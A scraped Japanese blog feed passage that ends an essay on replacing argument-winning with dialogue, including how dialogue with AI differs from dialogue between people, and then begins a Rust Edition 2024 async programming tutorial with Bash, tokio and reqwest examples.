いや、対話を殺すだけではありません。関係を壊します。信頼を失います。学習機会を逃す。最終的には、自分自身を孤立させます。論破された相手は、何を感じるでしょうか。屈辱です。「自分は間違っていました」という敗北感。「この人とは、もう話したくない」という拒絶。論破によって、あなたは1つの議論には勝っただろう。しかし、相手との対話の可能性を永久に失いました。より悪いことに、論破は自分自身の成長も止めます。なぜなら論破する人は、相手から学ぶ機会を放棄しているからだ。相手の視点を理解しようとしない。相手の経験から学ぼうとしない。ただ、相手の間違いを見つけることに集中します。論破に依存すると、世界が狭くなります。対話可能な相手が減っていく。人々は、あなたを避けるようになります。あなたは孤立します。対話と論破の違いは何か。目的が違います。論破の目的は、勝利です。相手を打ち負かすこと。一方、対話の目的は、相互理解です。共に学ぶこと。姿勢が違います。論破する人は、相手を敵と見ます。対話する人は、相手をパートナーと見ます。結果が違います。論破の後には、勝者と敗者が残ります。対話の後には、両者の成長が残ります。もしあなたが「正しさ」を証明したいなら、論破すればいい。しかし、もしあなたが「真実」に近づきたいなら、対話しなければならない。なぜなら真実は一人の人間の視点に収まらないからだ。真実は複数の視点の交差点にあります。論破から対話へのシフトは、パラダイムの転換です。ゼロサムゲームから、ポジティブサムゲームへ。思考の終わりから、思考の始まりへ。自己の強化から、自己の拡張へ。このシフトには、勇気が要る。「勝つ」という快楽を手放す勇気。「正しい」という確信を疑う勇気。「変わる」という可能性を受け入れる勇気。この勇気こそが、成長の源です。AI時代における対話の価値生成AIが登場して、私たちの仕事は変わりました。コードを書く速度が上がりました。ドキュメントを作成する時間が減りました。質問に対する答えが、即座に返ってくるようになった。人間同士の対話は、不要になったのでしょうか。AIに質問すれば答えが返ってきます。AIと議論すれば、論理的な反論が返ってきます。人間と対話する必要が、あるのでしょうか。あります。 それも、これまで以上に。なぜならAIとの対話と人間との対話は、現時点では本質的に異なる性質を持つからだ。AIとの対話と人間との対話の違いは、以下の軸で捉えられます。経験の固有性。AI：訓練データのパターンから応答を生成します。人間：固有の人生経験から応答が生まれます。この違いは、応答の予測可能性に影響します。AIの応答は洗練されていますが、パターンの組み合わせです。人間の応答は、データのパターンでは予測できない個別性を持ちます。相互的変容の有無。AI：対話によって自身の認識の枠組みは変わりません(現時点)。人間：対話によって互いの認識が変容しうる。AIに話を聞いてもらっても、「理解された」という実感は限定的です。なぜならAIには「あなたの話が私の認識を変えた」という相互的な影響がないからだ。一方、人間同士では「あなたの話を聞いて、私は何かを感じました」という実存的な承認が生まれます。関係性の蓄積。AI：各セッションは独立しています。人間：対話の履歴が信頼や理解の基盤となります。2つの異なる人生経験が衝突し、融合し、まったく新しい視点が創発します。この過程は、関係性の深まりを前提とします。実存的リスク。AI：どんな意見を言っても関係性にリスクはありません。人間：意見の衝突が関係性を損なう可能性があります。否定されると、傷つく。この摩擦が、人間との対話を難しくします。しかし、この摩擦の中にこそ、成長があります。重要なのは、AIと人間のどちらが優れているかではありません。それぞれの特性を理解し、目的に応じて使い分けることです。情報の整理、アイデアの初期生成、論理のチェックなどはAIが効率的です。一方、認識の変容、実存的な対話、信頼関係の構築などは、人間同士の対話が適しています。しかし、ここにリスクもあります。AIとの対話は、楽です。予測可能です。抵抗がない。反論されても、傷つかない。一方、人間との対話は、難しい。予測不可能です。摩擦があります。否定されると、傷つく。だから、私たちはAIとの対話に逃げる危険があります。人間との対話を避け、AIとだけ話すようになります。これは、対話筋力の退化です。AI時代だからこそ、意識的に人間と対話しなければならない。 不快でも、難しくても、予測不可能でも。なぜなら、その摩擦の中にこそ、成長があります。創造があります。人間性があります。おわりに会議室の二人は、まだ平行線でした。Aは「拡張性」を主張し続けます。Bは「納期」を主張し続けます。どちらも譲らない。どちらも、相手を理解しようとしない。私は、口を開きました。「すみません、確認したいのですが。Aさんが『拡張性』と言うとき、具体的にどんなリスクを心配しているんですか」Aは少し驚いた顔で答えた。「前のプロジェクト、機能追加のたびに大規模な修正を要し、半年間リリース停止になったんです。だから...」「なるほど。では、Bさんが『納期』を強調するのは、どういう背景があるのですか」Bも答えた。「顧客との契約で、この機能のリリース日が明示されていて。遅れると、ペナルティが発生するんです」沈黙が流れた。Aが言いました。「契約の話、知りませんでした。それなら、確かに納期は守らないといけないですね」Bも言いました。「前のプロジェクトでそんなことがあったんですね。それは大変でしたね。じゃあ、最小限の拡張性を確保する方法、一緒に考えてほしいです」会議室の空気が、少し変わりました。対立から、対話へ。対話は、魔法ではありません。 すべての問題を解決するわけではありません。意見の対立が消えるわけでもない。でも、対話があれば、前に進めます。互いを理解しながら、解を探せます。私たちの多くは、対話の仕方を教わっていない。学校でも、職場でも。だから、本能的に反応します。防御します。攻撃します。関係が壊れていく。でも、対話は学べます。 訓練できます。一歩ずつ、積み重ねられます。完璧である必要はない。不完全な対話でも、無対話よりはるかにましです。まず、自分の自動反応を中断すること。「今、私は防御的になっています」と気づくこと。一呼吸置くこと。次に、相手の世界を理解しようとすること。「なぜそう考えるのか」と問うこと。相手の背景、経験、価値観を探ること。そして、自分のナラティヴから降りること。「私の見方は、絶対ではありません」と認めること。新しい視点に開かれていること。対話は、時間がかかる。効率的ではありません。しかし持続可能です。 対話を通じて築かれた理解は、表面的な合意よりもはるかに強い。対話を通じて生まれた解は、押し付けられた解よりもはるかに実行可能です。そして、対話は、私たち自身を変えます。相手の視点に触れることで、自分の認識が広がる。自分の限界に気づく。新しい可能性が見えます。対話は、自己を拡張する行為です。技術だけでは、組織は動かない。プロセスだけでは、イノベーションは生まれません。ツールだけでは、問題は解決しない。必要なのは、人と人との対話です。異なる世界観が出会い、衝突し、融合する場です。エンジニアとして、私たちは論理を重視します。データを重視します。効率を重視します。これは大切です。しかし、それだけでは足りない。人間の認識の複雑さ、関係性の重要性、対話の力。 これらを理解しなければ、どんなに優れた技術も、組織の中で機能しない。対話は完成しない。永遠に未完成です。でも、試み続けることができます。 その試みの一歩一歩が、こじれた現場に、小さな橋を架けていく。あなたの次の一歩は、何か。今日、誰と対話するでしょうか。その対話の中で、あなたはどう変わるでしょうか。答えは、対話の中にあります。参考文献対話の実践力: ケアを極める聞き方・話し方作者:小瀬古伸幸中央法規出版Amazon学びをつくる問いと対話のデザイン: 探究・研修・大人の学び作者:福島 創太学文社Amazon優れたリーダーはなぜ、対話力を磨くのか？作者:堀井悠,松本悠幹クロスメディア・パブリッシング(インプレス)Amazonダイアローグ――対立から共生へ、議論から対話へ作者:デヴィッド・ボーム英治出版Amazon問いの編集力 思考の「はじまり」を探究する作者:安藤昭子ディスカヴァー・トゥエンティワンAmazon私たちはどう学んでいるのか　――創発から見る認知の変化 (ちくまプリマー新書)作者:鈴木宏昭筑摩書房Amazon創造と創発の心理学〈下〉: 越境がもたらす癒しと変容作者:吉野 大輔学文社Amazon創造と創発の心理学〈上〉: つながりがもたらす新たな秩序作者:吉野 大輔学文社Amazon「良い質問」を40年磨き続けた対話のプロがたどり着いた 「なぜ」と聞かない質問術作者:中田 豊一ダイヤモンド社Amazon「変化を嫌う人」を動かす:魅力的な提案が受け入れられない4つの理由作者:ロレン・ノードグレン,デイヴィッド・ションタル,船木 謙一(監修)草思社Amazon他者と働く──「わかりあえなさ」から始める組織論 (NewsPicksパブリッシング)作者:宇田川元一ニューズピックスAmazon企業変革のジレンマ 「構造的無能化」はなぜ起きるのか作者:宇田川元一日経BPAmazon私文ホワイトカラーが AI・コンサルに仕事を奪われない働き方戦略作者:株式会社板橋　東京中央支店かんき出版Amazonだから僕たちは、組織を変えていける ――やる気に満ちた「やさしいチーム」のつくりかた【ビジネス書グランプリ2023「マネジメント部門賞」受賞！】作者:斉藤徹クロスメディア・パブリッシング（インプレス）AmazonDD(どっちもどっち)論 「解決できない問題」には理由がある (WPB eBooks)作者:橘玲集英社AmazonHigh Conflict よい対立 悪い対立 世界を二極化させないために作者:アマンダ・リプリーディスカヴァー・トゥエンティワンAmazon「わかりあえない」を越える――目の前のつながりから、共に未来をつくるコミュニケーション・NVC作者:マーシャル・B・ローゼンバーグ海士の風Amazon有と無: 見え方の違いで対立する二つの世界観作者:細谷功株式会社dZEROAmazon「無理」の構造　この世の理不尽さを可視化する作者:細谷功株式会社dZEROAmazonはじめての人類学: 講談社現代新書作者:奥野 克巳AudibleAmazon文化人類学入門（増補改訂版） (中公新書)作者:祖父江孝男中央公論新社Amazonアイデア資本主義 文化人類学者が読み解く資本主義のフロンティア作者:大川内 直子AudibleAmazon","isoDate":"2025-11-19T10:48:09.000Z","dateMiliSeconds":1763549289000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"上手に待つ技術：Rust Edition 2024で学ぶ非同期処理入門","link":"https://syu-m-5151.hatenablog.com/entry/2025/11/18/155416","contentSnippet":"はじめにプログラミングにおいて「待つ」処理は避けられません。サーバからのレスポンスを待つ、データベースの処理が終わるのを待つ、ファイルの読み込みが完了するのを待つ——この「待ち時間」の使い方が、プログラムの性能を大きく左右します。非同期処理とは、ある処理の完了を待たずに次の処理を開始する技術です。待っている間に他のタスクを処理することで、限られたリソースを効率的に活用できます。本記事では、以下の内容を解説します。Bashでの基本的な非同期処理Rust Edition 2024における非同期プログラミングの基礎実践的なコード例とパターン実際に動作するコード例を通じて、非同期処理の基礎から実践的なパターンまでを学んでいきましょう。Bashでの非同期処理シェルスクリプトでも基本的な非同期処理が可能です。まずは簡単な例から見ていきましょう。#!/bin/bash# バックグラウンドで実行echo \\"タスク1を開始...\\"sleep 3 &pid1=$!echo \\"タスク2を開始...\\"sleep 2 &pid2=$!echo \\"タスク3を開始...\\"sleep 4 &pid3=$!# すべてのタスクの完了を待つecho \\"すべてのタスクが完了するのを待っています...\\"wait $pid1echo \\"タスク1が完了しました\\"wait $pid2echo \\"タスク2が完了しました\\"wait $pid3echo \\"タスク3が完了しました\\"echo \\"すべて完了！\\"このスクリプトでは、& をコマンドの最後につけることで、そのコマンドをバックグラウンドで実行しています。wait コマンドで特定のプロセスの終了を待ちます。実用的な例：複数サーバの監視より実用的な例として、複数のサーバの死活監視を同時に行うスクリプトを見てみましょう。#!/bin/bashcheck_server() {    local server=$1    local start_time=$(date +%s)        if ping -c 1 -W 2 \\"$server\\" > /dev/null 2>&1; then        local end_time=$(date +%s)        local duration=$((end_time - start_time))        echo \\"$server: OK (${duration}秒)\\"    else        echo \\"$server: 到達不可\\"    fi}# 複数のサーバを同時にチェックservers=(\\"google.com\\" \\"github.com\\" \\"stackoverflow.com\\" \\"rust-lang.org\\")for server in \\"${servers[@]}\\"; do    check_server \\"$server\\" &done# すべての完了を待つwaitecho \\"すべてのチェックが完了しました\\"順次実行すれば8秒かかるところを、並行実行で2秒程度に短縮できます。Bashの非同期処理の限界ただし、Bashの非同期処理には以下のような限界があります。プロセス単位での並行処理のため、オーバーヘッドが大きいエラーハンドリングが煩雑状態の共有が難しい細かい制御ができないより洗練された非同期処理には、プログラミング言語レベルでのサポートが必要となります。なぜ非同期処理が重要なのかハードウェアの性能向上の鈍化ハードウェアの性能向上は、2010年代以降、鈍化しています。NVIDIAのCEO Jensen Huangが2017年5月のCOMPUTEX TAIPEIで「ムーアの法則は死んだ」と述べました。単純にクロック速度を上げることで性能を向上させる時代は終わったのです。つまり、これ以上は単に「速いコンピュータを買えばいい」という解決策が使えなくなってきています。ソフトウェア要求の増大一方で、ソフトウェアに対する要求は増大し続けています。マイクロサービスアーキテクチャでは、システム内でのI/O呼び出しの回数が激増Webアプリケーションは、複数のAPIを並行して呼び出す必要があるモバイルアプリは、限られたリソースで複数のタスクを処理しなければならないここで重要になるのが非同期プログラミングです。並行処理・並列処理・非同期処理の違いと使い分けこれらの用語は混同されやすいですが、それぞれ異なる概念を指します。並行処理（Concurrency）複数のタスクが論理的に同時進行しているように見せる技術です。シングルコアCPUでも実現可能で、タスクを高速に切り替えながら実行します。例えば、レストランで一人のシェフが玉ねぎを炒めている間にトマトを切る動作が並行処理に相当します。参考：fastapi.tiangolo.com並列処理（Parallelism）複数のタスクが物理的に同時実行される技術です。マルチコアCPUを活用し、実際に複数の処理が同じ瞬間に実行されます。複数のシェフがそれぞれ別の料理を作る状態が並列処理に相当します。目的は処理速度の向上です。参考：freak-da.hatenablog.com非同期処理（Asynchronous）ある処理の完了を待たずに次の処理を開始する技術です。I/O操作のような「待ち時間」が多い処理に特に有効で、ネットワークリクエストのレスポンスを待っている間に他の処理を進められます。目的は待ち時間の有効活用です。まとめこれらは異なる次元の概念であり、組み合わせて使用できます。非同期処理を並行的に実行したり、並列に実行したりできます。CPUのコア数を増やさなくても、非同期プログラミングを用いれば性能を向上させることができます。サーバからのレスポンスを待っている時間があるなら、その間に他のタスクを処理すればよいのです。参考：qiita.comRust Edition 2024における非同期処理Rustの非同期処理は、2025年2月20日にリリースされたRust 1.85.0で、Edition 2024が安定化されました。これはRust史上最大規模のEditionとなりました。参考：blog.rust-lang.orgEdition 2024の哲学Rust Editionは、Rustの後方互換性を保ちながら破壊的変更を導入するための仕組みです。Rust 1.0がリリースされた際、チームは「1.xのどのバージョンでコンパイルできたコードは、将来の1.yバージョンでも問題なくコンパイルできる」という約束をしました。しかし、言語の進化には破壊的変更が必要な場合もあります。Editionはこの問題を解決します。参考：doc.rust-lang.orgEdition 2024は、多くの小さな改善の集合体です。大きな単一機能ではなく、言語全体の洗練を目指しています。言語は停滞せず、かつ急激な変化も避けるという健全な進化を示しています。参考：bertptrs.nlEdition 2024の主要な変更点1. Async Closures の段階的な導入これは非同期プログラミングにおける重要な機能の1つです。Edition 2024では基本的なasync closuresがサポートされました。ただし、async Fn()トレイト構文は2025年1月時点でまだunstableです。実際にはFn() -> impl Futureの形式で記述する必要があります。use std::time::Duration;// ついに可能になった！let async_closure = async || {    tokio::time::sleep(Duration::from_secs(1)).await;    \\"完了\\".to_string()};// AsyncFnトレイトを使った高階関数// 注：async Fn()構文はまだunstableのため、以下のように記述しますasync fn process_with_async_closure<F, Fut>(f: F) -> Stringwhere    F: Fn() -> Fut,    Fut: std::future::Future<Output = String>,{    f().await}#[tokio::main]async fn main() {    let result = async_closure().await;    println!(\\"結果: {}\\", result);        let result = process_with_async_closure(async || {        \\"非同期クロージャ\\".to_string()    }).await;    println!(\\"結果: {}\\", result);}これまでは、非同期のクロージャを書くために複雑な回避策が必要だったが、Edition 2024ではネイティブにサポートされるようになった。これにより、高階関数を使った非同期プログラミングが大幅に簡潔になる。参考：medium.com2. async fn in traits の完全サポートこれはRust 1.75.0で安定化された機能だが、Edition 2024の文脈で完全に統合された。use std::time::Duration;// これがついに標準機能に！trait AsyncService {    async fn process(&self, data: String) -> Result<String, Box<dyn std::error::Error>>;    async fn validate(&self, input: &str) -> bool;}struct MyService;impl AsyncService for MyService {    async fn process(&self, data: String) -> Result<String, Box<dyn std::error::Error>> {        tokio::time::sleep(Duration::from_secs(1)).await;        Ok(format!(\\"処理完了: {}\\", data))    }        async fn validate(&self, input: &str) -> bool {        !input.is_empty()    }}// ジェネリックな非同期関数でも使えるasync fn use_service<T: AsyncService>(service: &T) {    match service.process(\\"データ\\".to_string()).await {        Ok(result) => println!(\\"{}\\", result),        Err(e) => eprintln!(\\"エラー: {}\\", e),    }}この機能により、トレイトベースの抽象化が非同期コードでも自然に使えるようになった。Niko Matsakisは2024年の初めに「async fn in traitsはAsync Rustのハードモードを終わらせる基盤」と述べている。参考：smallcultfollowing.com3. PreludeへのFutureとIntoFutureの追加// もうuseステートメントが不要！// use std::future::Future; // ← 不要になったasync fn my_future() -> i32 {    42}// FutureもIntoFutureもpreludeに含まれているので// そのまま使えるfn process_future<F: Future<Output = i32>>(future: F) {    // ...}これは小さな変更に見えるが、非同期コードを書く際の摩擦を大幅に減らす。4. RPIT（Return Position impl Trait）のライフタイム捕捉ルールの改善// Edition 2021での問題fn old_way(x: &str) -> impl Future<Output = String> {    async move {        // xのライフタイムが正しく捕捉されない場合があった        x.to_string()    }}// Edition 2024での改善fn new_way(x: &str) -> impl Future<Output = String> {    async move {        // ライフタイムが適切に捕捉される        x.to_string()    }}// use<..> で明示的な制御も可能fn explicit_capture<\'a>(x: &\'a str) -> impl Future<Output = String> + use<\'a> {    async move {        x.to_string()    }}この改善により、非同期関数から返されるimpl Future型のライフタイム推論がより直感的になった。参考：www.heise.de5. 一時変数のスコープ改善// if let での一時変数のドロップタイミングが改善async fn process() {    if let Some(data) = fetch_data().await {        // Edition 2024では、dataはこのブロック内でのみ有効        println!(\\"{}\\", data);    } // ← dataはここでドロップされる}// tail expressionでの改善async fn compute() -> i32 {    let result = calculate().await;    result * 2  // この一時変数のスコープも改善された}これは非同期コードにおける「一時的な値がスコープ外になるまで保持される」問題を解決します。以前はコンパイルエラーになっていたコードが、Edition 2024では正しく動作します。6. unsafeの厳格化// Edition 2024では、extern blockはunsafeマーク必須unsafe extern \\"C\\" {    fn external_function();}// 環境変数の操作もunsafeにunsafe {    std::env::set_var(\\"KEY\\", \\"value\\");}unsafeの範囲がより明確になり、安全でない操作がコード中で目立つようになった。これにより、コードレビュー時に安全性を検証しやすくなる。Edition 2024への移行[package]name = \\"my-async-app\\"version = \\"0.1.0\\"edition = \\"2024\\"  # ← ここを変更[dependencies]tokio = { version = \\"1\\", features = [\\"full\\"] }多くの場合、cargo fixで自動的に移行できる：cargo fix --edition実践例：Edition 2024の機能を使ったコードuse std::time::Duration;// Async closureを使った例async fn process_items<F, Fut>(items: Vec<String>, processor: F) -> Vec<String>where    F: Fn(String) -> Fut,    Fut: std::future::Future<Output = String>,{    let mut results = Vec::new();    for item in items {        results.push(processor(item).await);    }    results}// Async trait methodを使った例trait DataProcessor {    async fn process(&self, data: &str) -> String;}struct UppercaseProcessor;impl DataProcessor for UppercaseProcessor {    async fn process(&self, data: &str) -> String {        tokio::time::sleep(Duration::from_millis(100)).await;        data.to_uppercase()    }}#[tokio::main]async fn main() {    // Async closureの使用    let items = vec![\\"hello\\".to_string(), \\"world\\".to_string()];    let results = process_items(items, |item| async move {        format!(\\"処理済み: {}\\", item)    })    .await;        println!(\\"結果: {:?}\\", results);        // Async traitの使用    let processor = UppercaseProcessor;    let result = processor.process(\\"rust 2024\\").await;    println!(\\"変換結果: {}\\", result);}非同期Rustのベストプラクティス（2024-2025）1. ブロッキング操作を避ける// ❌ 悪い例#[tokio::main]async fn main() {    tokio::spawn(async {        // std::thread::sleepはスレッドをブロックする        std::thread::sleep(Duration::from_secs(5));    });}// ✅ 良い例#[tokio::main]async fn main() {    tokio::spawn(async {        // tokio::time::sleepは非同期        tokio::time::sleep(Duration::from_secs(5)).await;    });}Tokioのような非同期ランタイムでは、ブロッキング操作は他のタスクの実行を妨げる。常に非同期版の関数を使用すること。参考：blog.poespas.me2. CPU集約的な処理は別スレッドでuse tokio::task;fn cpu_intensive_work(n: u64) -> u64 {    // フィボナッチ数の計算など    (0..n).sum()}#[tokio::main]async fn main() {    // CPU集約的な処理はspawn_blockingで    let result = task::spawn_blocking(|| {        cpu_intensive_work(1_000_000)    }).await.unwrap();        println!(\\"結果: {}\\", result);}非同期ランタイムはI/O待機に最適化されている。CPU集約的なタスクはspawn_blockingを使って別スレッドプールで実行します。参考：medium.com3. 適切なランタイム設定// シングルスレッドランタイム（軽量）#[tokio::main(flavor = \\"current_thread\\")]async fn main() {    // 単純なI/O処理に適している}// マルチスレッドランタイム（デフォルト）#[tokio::main(flavor = \\"multi_thread\\", worker_threads = 4)]async fn main() {    // 多数の並行タスクがある場合}アプリケーションの特性に応じてランタイムを選択します。4. エラーの適切な伝搬use anyhow::Result;async fn step1() -> Result<String> {    Ok(\\"ステップ1完了\\".to_string())}async fn step2() -> Result<String> {    Ok(\\"ステップ2完了\\".to_string())}async fn process() -> Result<()> {    let result1 = step1().await?;    let result2 = step2().await?;        println!(\\"{}\\", result1);    println!(\\"{}\\", result2);        Ok(())}#[tokio::main]async fn main() {    if let Err(e) = process().await {        eprintln!(\\"エラー: {}\\", e);    }}?演算子を活用し、エラーを適切に伝搬させる。anyhowクレートは便利なエラーハンドリングを提供します。5. Send境界の理解use std::sync::Mutex;use tokio::sync::Mutex as TokioMutex;// ❌ 悪い例：std::sync::MutexGuardはSendではないasync fn bad_example() {    let data = Mutex::new(0);    let guard = data.lock().unwrap();        // これはコンパイルエラー    // some_async_function().await;}// ✅ 良い例：tokio::sync::Mutexを使用async fn good_example() {    let data = TokioMutex::new(0);    let guard = data.lock().await;        // これは問題ない    some_async_function().await;}マルチスレッドランタイムでは、awaitポイントを跨ぐデータはSendでなければならない。tokio::syncの型を使用すること。参考：www.shuttle.dev実践：非同期HTTPリクエストで性能を比較実際のコードで、非同期の威力を確認してみよう。依存関係の設定[dependencies]tokio = { version = \\"1\\", features = [\\"full\\"] }reqwest = { version = \\"0.11\\", features = [\\"json\\"] }同期的なアプローチuse std::time::Instant;use reqwest::Error;#[tokio::main]async fn main() -> Result<(), Error> {    let url = \\"https://3-shake.com/\\";    let start_time = Instant::now();    // 順番に4回リクエスト    for i in 1..=4 {        let response = reqwest::get(url).await?;        println!(\\"リクエスト {} 完了: ステータス {}\\", i, response.status());    }    let elapsed = start_time.elapsed();    println!(\\"合計時間: {} ms\\", elapsed.as_millis());    // 出力例: 合計時間は環境により変動（概ね数百ms程度）    Ok(())}非同期的なアプローチuse std::time::Instant;use reqwest::Error;#[tokio::main]async fn main() -> Result<(), Error> {    let url = \\"https://3-shake.com/\\";    let start_time = Instant::now();    // 4つのリクエストを同時に実行    let (r1, r2, r3, r4) = tokio::join!(        reqwest::get(url),        reqwest::get(url),        reqwest::get(url),        reqwest::get(url),    );    // 結果を確認    println!(\\"リクエスト1: {:?}\\", r1.map(|r| r.status()));    println!(\\"リクエスト2: {:?}\\", r2.map(|r| r.status()));    println!(\\"リクエスト3: {:?}\\", r3.map(|r| r.status()));    println!(\\"リクエスト4: {:?}\\", r4.map(|r| r.status()));        let elapsed = start_time.elapsed();    println!(\\"合計時間: {} ms\\", elapsed.as_millis());    // 出力例: 合計時間は環境により変動    Ok(())}並行実行による性能改善ネットワークのレスポンスを待っている間、CPUは他のリクエストを処理できます。実際の性能改善はネットワーク状況、サーバーの同時接続制限、HTTP/2の利用状況などに依存しますが、理想的な条件下では、並行実行により順次実行と比べて大幅な時間短縮が可能です。より実践的な例：並行データ処理複数のAPIからデータを取得して統合する、よくあるシナリオを見てみましょう。use reqwest::Error;use serde::Deserialize;use std::time::Instant;#[derive(Deserialize, Debug)]struct User {    id: i32,    name: String,    email: String,}#[derive(Deserialize, Debug)]struct Post {    id: i32,    title: String,    body: String,}#[derive(Debug)]struct UserProfile {    user: User,    posts: Vec<Post>,    comments_count: usize,}async fn fetch_user(user_id: i32) -> Result<User, Error> {    let url = format!(        \\"https://jsonplaceholder.typicode.com/users/{}\\",         user_id    );    reqwest::get(&url)        .await?        .json::<User>()        .await}async fn fetch_user_posts(user_id: i32) -> Result<Vec<Post>, Error> {    let url = format!(        \\"https://jsonplaceholder.typicode.com/posts?userId={}\\",         user_id    );    reqwest::get(&url)        .await?        .json::<Vec<Post>>()        .await}async fn fetch_comments_count(user_id: i32) -> Result<usize, Error> {    let url = format!(        \\"https://jsonplaceholder.typicode.com/comments?postId={}\\",         user_id    );    let comments = reqwest::get(&url)        .await?        .json::<Vec<serde_json::Value>>()        .await?;    Ok(comments.len())}async fn get_user_profile(user_id: i32) -> Result<UserProfile, Error> {    // 3つのAPIを並行して呼び出す    let (user_result, posts_result, comments_result) = tokio::join!(        fetch_user(user_id),        fetch_user_posts(user_id),        fetch_comments_count(user_id),    );    Ok(UserProfile {        user: user_result?,        posts: posts_result?,        comments_count: comments_result?,    })}#[tokio::main]async fn main() -> Result<(), Error> {    let start = Instant::now();        let profile = get_user_profile(1).await?;        let duration = start.elapsed();        println!(\\"ユーザー: {}\\", profile.user.name);    println!(\\"投稿数: {}\\", profile.posts.len());    println!(\\"コメント数: {}\\", profile.comments_count);    println!(\\"\\\\n処理時間: {} ms\\", duration.as_millis());        Ok(())}3つのAPI呼び出しを並行実行することで、順次実行する場合の3分の1程度の時間で完了します。Future とタスクの理解Rustの非同期処理の核心は Future トレイトです。pub trait Future {    type Output;        fn poll(self: Pin<&mut Self>, cx: &mut Context<\'_>)         -> Poll<Self::Output>;}pub enum Poll<T> {    Ready(T),    Pending,}async関数は、Futureを返す関数に変換されます。// これを書くと...async fn example() -> i32 {    42}// コンパイラがこのように変換するfn example() -> impl Future<Output = i32> {    // 状態機械の実装}Futureは遅延評価されます。awaitされるまで実行されない。これにより、効率的なリソース管理が可能になる。参考：cosmicmeta.ioカスタムFutureの実装理解を深めるため、カウンターFutureを自作する例を示します。use std::future::Future;use std::pin::Pin;use std::task::{Context, Poll};use std::time::Duration;struct CounterFuture {    count: u32,    max: u32,}impl CounterFuture {    fn new(max: u32) -> Self {        Self { count: 0, max }    }}impl Future for CounterFuture {    type Output = u32;    fn poll(mut self: Pin<&mut Self>, cx: &mut Context<\'_>)         -> Poll<Self::Output>     {        self.count += 1;        println!(\\"ポーリング #{}: カウント = {}\\", self.count, self.count);                // 実際の待機をシミュレート        std::thread::sleep(Duration::from_millis(100));                if self.count < self.max {            // まだ完了していない            cx.waker().wake_by_ref();            Poll::Pending        } else {            // 完了            Poll::Ready(self.count)        }    }}#[tokio::main]async fn main() {    let future1 = CounterFuture::new(3);    let future2 = CounterFuture::new(3);        let (result1, result2) = tokio::join!(future1, future2);        println!(\\"\\\\n結果1: {}\\", result1);    println!(\\"結果2: {}\\", result2);}出力：ポーリング #1: カウント = 1ポーリング #1: カウント = 1ポーリング #2: カウント = 2ポーリング #2: カウント = 2ポーリング #3: カウント = 3ポーリング #3: カウント = 3結果1: 3結果2: 32つのFutureが交互にポーリングされている様子がわかる。エラーハンドリングとキャンセル安全性エラーハンドリングのベストプラクティスuse std::time::Duration;use tokio::time::timeout;async fn risky_operation() -> Result<String, &\'static str> {    tokio::time::sleep(Duration::from_secs(2)).await;    Ok(\\"成功\\".to_string())}async fn slow_operation() -> Result<String, &\'static str> {    tokio::time::sleep(Duration::from_secs(10)).await;    Ok(\\"遅い操作完了\\".to_string())}#[tokio::main]async fn main() {    // タイムアウト付き実行    let result = timeout(        Duration::from_secs(3),        slow_operation()    ).await;        match result {        Ok(Ok(value)) => println!(\\"成功: {}\\", value),        Ok(Err(e)) => println!(\\"操作エラー: {}\\", e),        Err(_) => println!(\\"タイムアウト\\"),    }        // 複数の操作を並行実行し、エラーを適切に処理    let results = tokio::join!(        risky_operation(),        risky_operation(),        risky_operation(),    );        match results {        (Ok(r1), Ok(r2), Ok(r3)) => {            println!(\\"すべて成功: {}, {}, {}\\", r1, r2, r3);        }        _ => {            println!(\\"一部が失敗しました\\");        }    }}キャンセル安全性Tyler Mandryは「Making Async Rust Reliable」で、キャンセル安全性の重要性を強調している。参考：tmandry.gitlab.io。use tokio::sync::Mutex;use std::sync::Arc;// キャンセル安全でない例async fn unsafe_increment(counter: Arc<Mutex<i32>>) {    let mut guard = counter.lock().await;    *guard += 1;    // ここでキャンセルされると、ロックが保持されたまま    tokio::time::sleep(Duration::from_secs(1)).await;}// キャンセル安全な例async fn safe_increment(counter: Arc<Mutex<i32>>) {    let mut guard = counter.lock().await;    *guard += 1;    drop(guard); // 明示的にロックを解放        tokio::time::sleep(Duration::from_secs(1)).await;}実践的なパターン集パターン1: 並行実行で最初に完了したものを使うasync fn fetch_from_server_a() -> Result<String, Box<dyn std::error::Error>> {    tokio::time::sleep(Duration::from_secs(2)).await;    Ok(\\"サーバーA\\".to_string())}async fn fetch_from_server_b() -> Result<String, Box<dyn std::error::Error>> {    tokio::time::sleep(Duration::from_secs(1)).await;    Ok(\\"サーバーB\\".to_string())}#[tokio::main]async fn main() {    use tokio::select;        // 最初に完了したほうを使う    select! {        result_a = fetch_from_server_a() => {            println!(\\"サーバーAから: {:?}\\", result_a);        }        result_b = fetch_from_server_b() => {            println!(\\"サーバーBから: {:?}\\", result_b);        }    }}パターン2: 複数のタスクをスポーンして管理use tokio::task::JoinHandle;async fn worker(id: i32, duration: u64) -> String {    tokio::time::sleep(Duration::from_secs(duration)).await;    format!(\\"ワーカー {} 完了\\", id)}#[tokio::main]async fn main() {    let mut handles: Vec<JoinHandle<String>> = Vec::new();        // 複数のワーカーをスポーン    for i in 0..5 {        let handle = tokio::spawn(worker(i, i as u64 + 1));        handles.push(handle);    }        // すべての完了を待つ    for handle in handles {        match handle.await {            Ok(result) => println!(\\"{}\\", result),            Err(e) => eprintln!(\\"エラー: {}\\", e),        }    }}パターン3: 共有状態の安全な管理use tokio::sync::RwLock;use std::sync::Arc;#[derive(Clone)]struct Counter {    value: Arc<RwLock<i32>>,}impl Counter {    fn new() -> Self {        Self {            value: Arc::new(RwLock::new(0)),        }    }        async fn increment(&self) {        let mut value = self.value.write().await;        *value += 1;    }        async fn get(&self) -> i32 {        let value = self.value.read().await;        *value    }}#[tokio::main]async fn main() {    let counter = Counter::new();    let mut handles = vec![];        // 10個のタスクで並行してインクリメント    for _ in 0..10 {        let counter_clone = counter.clone();        let handle = tokio::spawn(async move {            for _ in 0..100 {                counter_clone.increment().await;            }        });        handles.push(handle);    }        // すべて完了を待つ    for handle in handles {        handle.await.unwrap();    }        println!(\\"最終カウント: {}\\", counter.get().await);    // 出力: 最終カウント: 1000}まとめ非同期処理における重要な概念を再確認しましょう。並行性（Concurrency）: 複数のタスクを論理的に同時進行させる技術効率性（Efficiency）: 待ち時間を無駄にせず他のタスクを処理することスケーラビリティ（Scalability）: リソースを効果的に使い多数のタスクを処理する能力応答性（Responsiveness）: ユーザーを待たせず素早く反応することRustの非同期処理は、型システムによる安全性保証と高い実行性能を両立しています。async/await構文はコードを簡潔に保ち、Futureトレイトは強力な抽象化を提供します。Tokioなどのランタイムは成熟しており、本番環境での使用実績も豊富です。Edition 2024以降も、Rustの非同期エコシステムは進化を続けています。async closures、send bound problem、async 